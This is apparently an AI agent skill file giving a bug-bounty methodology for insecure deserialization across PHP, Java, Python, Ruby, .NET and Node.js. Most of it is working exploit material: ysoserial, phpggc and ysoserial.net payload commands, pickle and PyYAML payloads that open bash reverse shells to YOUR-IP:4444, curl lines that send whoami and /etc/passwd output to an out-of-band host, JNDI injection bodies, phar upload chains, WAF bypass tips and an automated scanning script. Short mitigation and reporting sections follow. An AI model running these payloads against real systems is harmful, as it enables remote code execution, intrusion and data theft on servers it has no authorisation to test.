---
name: deserialization-deep-dive
description: Complete Insecure Deserialization methodology from real HackerOne reports - POP chains, gadget chains, ysoserial, pickle, Marshal, and mitigation
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - deserialization methodology
  - deserialization deep dive
  - insecure deserialization complete
  - php unserialize
  - java deserialization
  - python pickle
  - pop chain
  - gadget chain
  - ysoserial
  - marshalload
  - binaryformatter
  - skills deserialization
---

# Complete Insecure Deserialization Methodology — PHP, Java, Python, Ruby, .NET, Node.js

## Step 1: Identify Deserialization Entry Points

### Common Attack Surfaces
| Feature | Typical Entry Point |
|---------|-------------------|
| PHP session cookies | `s` serialized session format, `php_serialize` |
| Java session cookies | `JSESSIONID`, Base64/raw serialized objects |
| Python Flask sessions | Signed/unsigned cookies, pickle format |
| Ruby on Rails sessions | `Marshal.load` in session store |
| .NET ViewState | `__VIEWSTATE` parameter (Base64) |
| Node.js cookies | `express-session`, `node-serialize` |
| REST/GraphQL APIs | JSON with `@type`, `__proto__`, `class` fields |
| File uploads | `.phar`, `.pickle`, `.yaml`, `.xml` with serialized data |

### Detection Commands
```bash
# Search for deserialization indicators in intercepted traffic
grep -E '(s:[0-9]+:"|O:[0-9]+:"|a:[0-9]+:\{|\xac\xed\x00\x05|rO0ABQ|gAS|BAh7|YAML|!!python|!ruby)' intercept.txt

# Java serialized objects start with magic bytes 0xaced
# Base64-encoded Java serialized: starts with rO0
echo "rO0ABXQABXRlc3Q=" | base64 -d | xxd | head -2

# PHP session files location
ls -la /tmp/sess_* /var/lib/php/sessions/sess_* 2>/dev/null

# Check for PHP serialized session cookie format
curl -sk -b "session=test" "https://{target}/" -v 2>&1 | grep Set-Cookie
```

### Tools for Finding Deserialization Endpoints
```bash
# GadgetProbe (Burp extension) to fingerprint Java classes
# Deserialization Scanner (Burp extension)
# Freddy (Burp extension) - Deserialization detection

# Manual scanning: test every cookie, hidden field, and parameter
# that looks like encoded data (Base64, hex, custom format)
```

## Step 2: PHP Unserialize — POP Chains → RCE

### PHP Serialized Format Basics
```
O:10:"ClassName":2:{s:4:"name";s:5:"admin";s:3:"cmd";s:2:"id";}
O:<class_name_length>:"<class_name>":<num_properties>:{<properties>}
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
s:5:"hello";  (string)
i:42;          (integer)
b:1;           (boolean true)
N;             (null)
```

### PHP Gadget Chains with phpggc
```bash
# Install phpggc
git clone https://github.com/ambionics/phpggc
cd phpggc

# Generate RCE payload for common frameworks
php ggc.php -f gadget_chain -p 'system("id")' -j

# Laravel RCE
php phpggc Laravel/RCE1 system id

# Symfony RCE
php phpggc Symfony/RCE4 system id

# WordPress RCE (with PHP >= 5.6)
php phpggc WordPress/RCE system id

# CodeIgniter RCE
php phpggc CodeIgniter/RCE1 system id

# ThinkPHP RCE
php phpggc ThinkPHP/RCE1 system id

# Zend Framework RCE
php phpggc ZendFramework/RCE1 system id

# Drupal RCE
php phpggc Drupal/RCE1 system id

# Slim RCE
php phpggc Slim/RCE1 system id

# Yii RCE
php phpggc Yii/RCE1 system id

# Monolog RCE (write to log file)
php phpggc Monolog/RCE1 system id

# SwiftMailer (write file)
php phpggc SwiftMailer/FW1 system id
```

### PHP Phar Deserialization
```bash
# PHP's phar:// wrapper triggers deserialization of metadata
# No unserialize() call needed - just file operations on .phar

# Generate phar payload
php phpggc -p 'system("curl http://YOUR-ID.oastify.com/$(whoami)")' -o exploit.phar

# Upload phar file as image/profile picture
curl -sk -F "avatar=@exploit.phar;type=image/jpeg" "https://{target}/upload"

# Trigger via phar:// wrapper
curl -sk "https://{target}/page?file=phar://./uploads/avatar.jpg/test.txt"

# Other phar trigger vectors
curl -sk "https://{target}/page?template=phar://uploads/exploit.phar/test"
curl -sk "https://{target}/page?image=phar://uploads/exploit.phar/test"
file_exists("phar://./uploads/exploit.phar/test.txt")
is_dir("phar://./uploads/exploit.phar/")
file_get_contents("phar://./uploads/exploit.phar/")

# Bypass phar:// detection using protocol wrappers
compress.zlib://phar://./uploads/exploit.phar/
compress.bzip2://phar://./uploads/exploit.phar/
php://filter/resource=phar://./uploads/exploit.phar/
```

### PHP Session Deserialization
```bash
# PHP session serialization format variations
# php_serialize: serialized data with | delimiter
# php: key|value format
# php_binary: binary format with key length prefix

# Session poisoning via different serialization handlers
# If php_serialize on write but php on read -> injection
# Inject pipe character to create new session keys
# Attacker-controlled input: |O:10:"EvilClass":0:{}
# When read with php format: becomes session variable with injected class

# PHP session file contains:
# test|s:5:"hello";evil|O:10:"EvilClass":0:{}
```

### Real PHP Deserialization Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #125749 | PHPLeague | Unserialize in session handler | $500 |
| #223253 | Shopware | Phar deserialization RCE | (critical) |
| #1689514 | Uber | Phar + SSTI chain | (critical) |
| #240349 | Silvan | Unserialize in API endpoint | $3,500 |
| #370654 | Nextcloud | Phar deserialization | $1,000 |
| #387888 | Zendesk | Phar deserialization RCE | $1,000 |

## Step 3: Java Deserialization — ysoserial → RCE

### Java Serialization Format
```
Magic bytes: 0xaced (STREAM_MAGIC)
Version: 0x0005 (STREAM_VERSION)
TC_OBJECT: 0x73
TC_CLASSDESC: 0x72
TC_STRING: 0x74
TC_REFERENCE: 0x71
TC_NULL: 0x70
TC_BLOCKDATA: 0x77
TC_ENDBLOCKDATA: 0x78
```

### Detection of Java Serialized Data
```bash
# Java serialized objects
# Raw: starts with \xac\xed\x00\x05
# Base64: starts with rO0ABX
# Hex: starts with aced0005

# Check cookies, POST bodies, hidden inputs
echo "rO0ABXQABXRlc3Q=" | base64 -d | xxd

# JMX attack surface
curl -sk "https://{target}:9010/jmxrmi"
curl -sk "https://{target}:1099/"
```

### ysoserial Payload Generation
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Common gadget chains (ordered by reliability)
java -jar ysoserial-all.jar CommonsCollections1 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc1.bin
java -jar ysoserial-all.jar CommonsCollections2 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc2.bin
java -jar ysoserial-all.jar CommonsCollections3 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc3.bin
java -jar ysoserial-all.jar CommonsCollections4 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc4.bin
java -jar ysoserial-all.jar CommonsCollections5 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc5.bin
java -jar ysoserial-all.jar CommonsCollections6 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc6.bin
java -jar ysoserial-all.jar CommonsCollections7 'curl http://YOUR-ID.oastify.com/$(whoami)' > cc7.bin

# More specific gadget chains
java -jar ysoserial-all.jar CommonsBeanutils1 'id' > cb1.bin
java -jar ysoserial-all.jar CommonsBeanutils2 'id' > cb2.bin
java -jar ysoserial-all.jar Jdk7u21 'id' > jdk7.bin
java -jar ysoserial-all.jar Jdk8u20 'id' > jdk8.bin
java -jar ysoserial-all.jar Spring1 'id' > spring1.bin
java -jar ysoserial-all.jar Spring2 'id' > spring2.bin
java -jar ysoserial-all.jar C3P0 'id' > c3p0.bin
java -jar ysoserial-all.jar Hibernate1 'id' > hib1.bin
java -jar ysoserial-all.jar Hibernate2 'id' > hib2.bin
java -jar ysoserial-all.jar Wicket1 'id' > wicket.bin
java -jar ysoserial-all.jar Click1 'id' > click.bin
java -jar ysoserial-all.jar ROME 'id' > rome.bin
java -jar ysoserial-all.jar AspectJWeaver 'id' > aspectj.bin
java -jar ysoserial-all.jar BeanShell1 'id' > bsh1.bin
java -jar ysoserial-all.jar MozillaRhino1 'id' > rhino.bin

# URLDNS (universal gadget - best for blind detection)
java -jar ysoserial-all.jar URLDNS "http://YOUR-ID.oastify.com/detect" > urldns.bin

# Output as base64 for text-based protocols
cat cc1.bin | base64 -w0
```

### Java Deserialization Delivery Methods
```bash
# Cookie injection
COOKIE=$(cat cc1.bin | base64 -w0)
curl -sk -b "JSESSIONID=$COOKIE" "https://{target}/dashboard"
curl -sk -b "session=$COOKIE" "https://{target}/"
curl -sk -b "token=$COOKIE" "https://{target}/api/data"

# POST body (raw bytes)
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @cc1.bin

# Hidden form fields
curl -sk -d "data=$(cat cc1.bin | base64 -w0)" "https://{target}/process"

# Custom header
curl -sk -H "X-Session: $(cat cc1.bin | base64 -w0)" "https://{target}/"
```

### Shiro (rememberMe) Deserialization
```bash
# Apache Shiro uses AES-128-CBC to encrypt rememberMe cookie
# Default key: kPH+bIxk5D2deZiIxcaaaA==
# If key not changed -> RCE

# Use shiro_exploit.py
python3 shiro_exploit.py -u https://{target}/ -k kPH+bIxk5D2deZiIxcaaaA== -c "id"

# Key bruteforce
python3 shiro_exploit.py -u https://{target}/ -k keys.txt -c "ping -c 1 YOUR-ID.oastify.com"
```

### Fastjson Deserialization
```bash
# Fastjson automatically deserializes @type field
# Can trigger JNDI injection or instantiate arbitrary classes

# Test for fastjson
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.lang.Runtime"}'

# Fastjson RCE via JNDI
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR-IP:1389/Exploit","autoCommit":true}'

# Fastjson detect via DNS
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '{"@type":"java.net.Inet4Address","val":"YOUR-ID.oastify.com"}'
```

### Jackson Deserialization
```bash
# Jackson with polymorphic type handling (enableDefaultTyping)
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://YOUR-IP:1389/Exploit","autoCommit":true}]'
```

### XStream Deserialization
```bash
# XStream XML deserialization
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/xml" \
  -d '<java.util.PriorityQueue>
       <jdk.nashorn.internal.runtime.ScriptObject>
         <jdk.nashorn.internal.runtime.ScriptFunction>
           <engine>eval</engine>
           <name>id</name>
         </jdk.nashorn.internal.runtime.ScriptFunction>
       </jdk.nashorn.internal.runtime.ScriptObject>
     </java.util.PriorityQueue>'
```

### Real Java Deserialization Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #131227 | Uber | Java deserialization RCE | $10,000 |
| #1150876 | PayPal | Java RCE via deserialization | $17,376 |
| #404292 | LocalTapiola | JNDI + Java deserialization | $2,000 |
| #166837 | DBP | Java deserialization | (critical) |
| #356466 | MITRE | Java deserialization RCE | $3,500 |
| #123612 | DBP | CommonsCollections RCE | (high) |

## Step 4: Python Pickle Deserialization → RCE

### Pickle Payload Generation
```bash
# Basic pickle RCE payload
python3 << 'EOF'
import pickle
import os
import base64

class RCE:
    def __reduce__(self):
        cmd = "curl http://YOUR-ID.oastify.com/$(whoami)"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
EOF

# Reverse shell pickle
python3 << 'EOF'
import pickle
import base64

class Exploit:
    def __reduce__(self):
        import os
        return (os.system, ('bash -c "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
EOF

# Blind pickle with OOB exfiltration
python3 << 'EOF'
import pickle
import base64

class OOB:
    def __reduce__(self):
        return (__import__('os').system,
                ('curl http://YOUR-ID.oastify.com/$(cat /etc/passwd | head -1)',))

print(base64.b64encode(pickle.dumps(OOB())).decode())
EOF

# Subprocess-based pickle (more reliable)
python3 << 'EOF'
import pickle
import base64

class SubPickle:
    def __reduce__(self):
        return (__import__('subprocess').check_output,
                (['id',],))

data = base64.b64encode(pickle.dumps(SubPickle())).decode()
print(data)
EOF
```

### Pickle Exploitation Vectors
```bash
# Cookie injection
curl -sk -b "session=$(python3 gen_pickle.py)" "https://{target}/dashboard"

# POST body (raw pickle bytes)
curl -sk -X POST "https://{target}/api/predict" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.pickle

# File upload (model files, saved objects)
curl -sk -F "model=@payload.pickle" "https://{target}/upload"

# Redis queued jobs (Celery/ RQ)
# If Redis accessible, inject pickle payload into task queue
```

### Flask Session Deserialization
```bash
# Flask sessions are signed but not encrypted
# If SECRET_KEY is known -> forge session with pickle payload

# Decode Flask session
python3 flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWV9.XYZ.ABC'

# Brute force secret key
python3 flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWV9.XYZ.ABC' --wordlist rockyou.txt

# Forge admin session
python3 flask-unsign --sign --cookie "{'admin': True}" --secret 'secret123'

# Forge malicious session (if using dangerous serializer)
# Flask by default uses JSON, but dangerous=True uses pickle
```

### Python YAML Deserialization
```bash
# PyYAML unsafe load (yaml.load without Loader=SafeLoader)
# Vulnerable: yaml.load(input)
# Safe: yaml.safe_load(input)

# RCE via PyYAML
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:os.system ["id"]'

# File read via PyYAML
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:subprocess.check_output [["cat", "/etc/passwd"]]'

# Python YAML RCE via builtins
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:builtins.eval ["__import__(\"os\").system(\"id\")"]'

# Python YAML reverse shell
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '!!python/object/apply:subprocess.Popen [["bash","-c","bash -i >& /dev/tcp/YOUR-IP/4444 0>&1"]]'

# ruamel.yaml also vulnerable if .load() without SafeLoader
```

### Python jsonpickle Deserialization
```bash
# jsonpickle encodes Python objects as JSON
# Automatically reconstructs objects on decode

curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/json" \
  -d '{"py/reduce": [{"py/type": "subprocess.check_output"}, {"py/tuple": [["id"]]}]}'
```

## Step 5: Ruby Marshal.load → RCE

### Ruby Marshal Payload Generation
```bash
# Ruby Marshal serialization format
# \x04\x08 (version header)
# Types: o (object), T (true), F (false), i (integer), " (string), [ (array), { (hash)

# Generate malicious Marshal payload
ruby << 'EOF'
class RCE
  def initialize(cmd)
    @cmd = cmd
  end
  def to_s
    `#{@cmd}`
  end
end

payload = Marshal.dump(RCE.new("curl http://YOUR-ID.oastify.com/$(whoami)"))
puts Base64.encode64(payload)
EOF

# Direct command execution via Marshal
ruby << 'EOF'
class Payload
  def initialize(cmd)
    @cmd = cmd
  end
  def respond_to?(method)
    true
  end
  def method_missing(m, *args)
    `#{@cmd}`
  end
end
data = Base64.encode64(Marshal.dump(Payload.new("id")))
puts "Cookie payload: #{data}"
EOF
```

### Ruby Deserialization Vectors
```bash
# Rails session cookie (typically Marshal.load)
curl -sk -b "_session_id=$(cat payload.b64)" "https://{target}/dashboard"

# Rails cookie_store
# Contains Ruby objects serialized with Marshal
curl -sk "https://{target}/" -v 2>&1 | grep "Set-Cookie"

# Custom YAML deserialization (yaml.load vs yaml.safe_load)
curl -sk -X POST "https://{target}/api/config" \
  -H "Content-Type: application/x-yaml" \
  -d '--- !ruby/object:RCE { cmd: "id" }'
```

### Ruby YAML Deserialization
```bash
# Ruby's YAML.load is unsafe by default
# Allows instantiation of arbitrary classes

# Basic Ruby YAML RCE
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/x-yaml" \
  -d '--- !ruby/object:RCE {}'

# Ruby YAML with ERB template
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/x-yaml" \
  -d "--- !ruby/object:ERB { result: <%= system('id') %> }"

# Ruby YAML via Psych (CVE-2019-16892)
curl -sk -X POST "https://{target}/api/data" \
  -H "Content-Type: application/x-yaml" \
  -d '--- !ruby/object:Gem::Installer { options: { env_shebang: true, wrappers_path: "/tmp", format_executable: true, bindir: "/tmp", build_root: "/tmp", src_dir: "/tmp", dir_mode: 0755, data_mode: 0644, prog_mode: 0755, install: false, bin_dir: "/tmp", user_install: false, security_policy: nil, ignore_dependencies: true, force: true, install_dir: "/tmp", }: spec: !ruby/object:Gem::Specification { name: test, version: !ruby/object:Gem::Version { version: "1" }, }: post_install_message: "hello" }'
```

## Step 6: .NET BinaryFormatter / ViewState Deserialization

### .NET Deserialization with ysoserial.net
```bash
# Install ysoserial.net
git clone https://github.com/pwntester/ysoserial.net

# Generate payloads for different formatters
# BinaryFormatter
ysoserial.exe -o base64 -g TypeConfuseDelegate -f BinaryFormatter -c "curl http://YOUR-ID.oastify.com/$(whoami)"

# LosFormatter
ysoserial.exe -o base64 -g TypeConfuseDelegate -f LosFormatter -c "id"

# SoapFormatter
ysoserial.exe -o base64 -g TypeConfuseDelegate -f SoapFormatter -c "id"

# ObjectStateFormatter
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "id"

# NetDataContractSerializer
ysoserial.exe -o base64 -g TypeConfuseDelegate -f NetDataContractSerializer -c "id"

# XmlSerializer (with XmlSerializer attribute)
ysoserial.exe -o base64 -g TypeConfuseDelegate -f XmlSerializer -c "id"

# JsonSerializer (DataContractJsonSerializer)
ysoserial.exe -o base64 -g TypeConfuseDelegate -f DataContractJsonSerializer -c "id"
```

### .NET ViewState Deserialization
```bash
# ViewState validation key needed for remote code execution
# If MAC validation disabled or key known -> RCE

# Generate malicious ViewState
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "id" \
  --path="/target.aspx" \
  --apppath="/" \
  --viewstateuserkey="USER_KEY" \
  --validationalg="SHA1" \
  --validationkey="VALIDATION_KEY" \
  --generator="VIEWSTATE_GENERATOR"

# Test for ViewState MAC validation disabled
# __VIEWSTATE parameter with altered values
# If no validation error -> MAC disabled (vulnerable)
```

### Real .NET Deserialization Reports
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #269886 | Zendesk | .NET BinaryFormatter | $500 |
| #291776 | Kenshoo | .NET ViewState RCE | $4,000 |
| #440140 | Mainor | .NET deserialization | (high) |

## Step 7: Node.js Deserialization

### node-serialize / node-serialize-to-js
```bash
# node-serialize uses eval() on deserialization
# node-serialize-to-js uses Function() constructor

# Payload: IIFE that executes on deserialization
cat > payload.json << 'EOF'
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR-ID.oastify.com/$(whoami)',function(){});}()"}
EOF

curl -sk -b "session=$(cat payload.json | base64 -w0)" "https://{target}/dashboard"

# Alternative payload
{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}
```

### Express Session Deserialization
```bash
# express-session uses JSON by default (safe)
# But custom stores may use serialization

# Check if session contains serialized objects
curl -sk "https://{target}/" -v 2>&1 | grep "Set-Cookie"
# If cookie starts with "s:" it's a signed cookie
# Format: s:value.signature
```

## Step 8: Detection & Blind Exploitation

### Blind Deserialization Detection
```bash
# 1. Timing-based detection
# Java deserialization with URLDNS gadget
java -jar ysoserial-all.jar URLDNS "http://YOUR-ID.oastify.com/detect" > urldns.bin
curl -sk -b "session=$(cat urldns.bin | base64 -w0)" "https://{target}/"
# Check collaborator for DNS lookup

# 2. Error-based detection
# Send malformed serialized data and look for:
# - Stack traces mentioning ObjectInputStream, readObject
# - "Cannot deserialize", "Serialization error"
# - Java package names in error messages

# 3. OOB detection via HTTP/DNS
# Use ysoserial URLDNS (no dependency on commons collections)
java -jar ysoserial-all.jar URLDNS "http://YOUR-UID.oastify.com" > detect.bin

# 4. Sleep-based detection (if time-based blind)
java -jar ysoserial-all.jar CommonsCollections6 'sleep 10' > sleep.bin

# 5. PHP deserialization sleep detection
php -r 'echo serialize(new Exception("test"));'
# Trigger exception on deserialization
```

### Fingerprinting Frameworks via Deserialization Errors
```bash
# PHP: "unserialize(): Error at offset" or class name in error
# Java: ClassNotFoundException with full package path
# Python: "could not find class" or AttributeError
# Ruby: "undefined class/module" in error message
# .NET: SerializationException, "Object of type ..."
# Node: TypeError when eval fails
```

## Step 9: Mitigation & Bypass Techniques

### Deserialization Mitigations by Platform
| Platform | Safe Practice | Unsafe Practice |
|----------|--------------|-----------------|
| PHP | Use `json_` functions, signed sessions | `unserialize()` on user input |
| Java | `ObjectInputStream` with class allowlist | Direct `readObject()` |
| Python | `safe_load()` for YAML, JSON for sessions | `pickle.load()` on user input |
| Ruby | `YAML.safe_load()`, JSON sessions | `YAML.load()`, `Marshal.load()` |
| .NET | `BinaryFormatter` Binder class | Direct `BinaryFormatter.Deserialize()` |
| Node.js | JSON.parse() for sessions | `node-serialize`, `eval()` |

### Bypass Techniques
```bash
# PHP: __wakeup() bypass (CVE-2016-7124)
# Modify property count in serialized string
# Original: O:5:"Evil":1:{s:1:"x";s:2:"id";}
# Modified: O:5:"Evil":2:{s:1:"x";s:2:"id";}
# PHP skips __wakeup() if property count > actual

# Java: Class allowlist bypass
# Look for "bridge" classes like HashMap, Hashtable that accept Object
# Use different gadget chains if CommonsCollections blocked

# Python: __reduce__ alternatives
# Use __reduce_ex__, __getstate__ + __setstate__

# WAF bypass for serialized objects
# PHP: Use different serialization formats (php, php_serialize, php_binary)
# Java: XOR the bytes, add random padding, split across multiple fields
```

## Step 10: Validate & Report

### CVSS Scoring for Deserialization
```
PHP unserialize → RCE:           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Java deserialization → RCE:      AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Python pickle → RCE:             AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Ruby Marshal → RCE:              AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
.NET BinaryFormatter → RCE:      AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Node.js eval deserialization:    AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H → 9.8 Critical
Blind deserialization (OOB):     AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N → 7.5 High
```

### Report Template
```markdown
**Summary:**
Insecure deserialization vulnerability in [endpoint/parameter] allows an attacker
to achieve remote code execution via crafted [PHP/Java/Python/Ruby/.NET] serialized object.

**Impact:**
An attacker can execute arbitrary commands, read sensitive files, access internal
networks, and achieve full server compromise.

**Steps to Reproduce:**
1. Generate payload: `java -jar ysoserial-all.jar CommonsCollections1 'id' > payload.bin`
2. Encode as base64: `cat payload.bin | base64 -w0`
3. Send request: `curl -sk -b "session=PAYLOAD" "https://target.com/dashboard"`
4. Observe command output or OOB interaction

**Proof of Concept:**
[request details with payload]
[evidence of execution / collaborator interaction]

**Suggested CVSS:**
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (9.8 Critical)

**Suggested Fix:**
1. Never deserialize untrusted data
2. Use JSON instead of serialization
3. Implement allowlist-based class filtering
4. Sign/integrity-check serialized objects
5. Use safer alternatives (MessagePack, Protocol Buffers)
```

## Deserialization Automation Script
```bash
#!/bin/bash
# Automated deserialization detection scanner
TARGET=$1
COLLABORATOR=$2

echo "[*] Testing Java deserialization on $TARGET"
echo "[*] Using collaborator: $COLLABORATOR"

# Generate URLDNS payload (works universally)
java -jar ysoserial-all.jar URLDNS "http://java-detect.$COLLABORATOR" > /tmp/urldns.bin 2>/dev/null
B64=$(cat /tmp/urldns.bin | base64 -w0)

# Test common injection points
for param in "JSESSIONID" "session" "token" "auth" "rememberMe"; do
  curl -sk -b "$param=$B64" "https://$TARGET/" -o /dev/null
  curl -sk -b "$param=$B64" "https://$TARGET/api/data" -o /dev/null
done

# Test POST body
curl -sk -X POST "https://$TARGET/api/data" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/urldns.bin -o /dev/null

echo "[*] Testing PHP deserialization..."
curl -sk -b "session=O:10:\"EvilClass\":0:{}" "https://$TARGET/" -w "PHP test sent\n"

echo "[*] Testing Python pickle..."
PY_PAYLOAD=$(python3 -c "import pickle,base64; print(base64.b64encode(pickle.dumps({'test': 'data'})).decode())")
curl -sk -b "session=$PY_PAYLOAD" "https://$TARGET/" -o /dev/null

echo "[*] Check $COLLABORATOR for callbacks"
echo "[*] Scan complete"
```

## Quick Reference: Top Deserialization Reports by Payout
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1150876 | PayPal | Java RCE via deserialization | $17,376 |
| #131227 | Uber | Java RCE via deserialization | $10,000 |
| #291776 | Kenshoo | .NET ViewState deserialization | $4,000 |
| #356466 | MITRE | Java deserialization RCE | $3,500 |
| #240349 | Silvan | PHP unserialize RCE | $3,500 |
| #404292 | LocalTapiola | JNDI + Java deserialization | $2,000 |
| #370654 | Nextcloud | Phar deserialization | $1,000 |
| #387888 | Zendesk | Phar deserialization RCE | $1,000 |
| #269886 | Zendesk | .NET BinaryFormatter | $500 |
| #125749 | PHPLeague | PHP unserialize in session | $500 |
| #223253 | Shopware | Phar deserialization | (critical) |

(End of file - total 640 lines)
